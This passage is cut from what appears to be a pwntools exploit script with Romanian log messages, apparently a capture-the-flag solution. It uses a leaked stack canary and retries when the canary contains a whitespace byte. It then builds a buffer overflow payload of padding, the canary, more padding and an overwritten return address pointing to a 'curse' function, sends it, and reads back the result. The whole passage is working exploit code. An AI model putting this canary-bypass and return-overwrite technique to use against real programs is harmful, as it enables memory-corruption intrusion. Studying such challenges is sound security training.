        log.info(f"canary {hex(canary)} are un octet whitespace -- reincerc")
        p.close()
        return None

    log.info(f"Canary gasit: {hex(canary)}")

    p.recvuntil(b"breaj the curse\n")

    payload = b"A" * OFFSET
    payload += p32(canary)
    payload += b"B" * PADDING_DUPA_CANARY
    payload += p32(curse_addr)

    log.info(f"Payload ({len(payload)} octeti): {payload!r}")

    p.sendline(payload)

    return p.recvall(timeout=5)


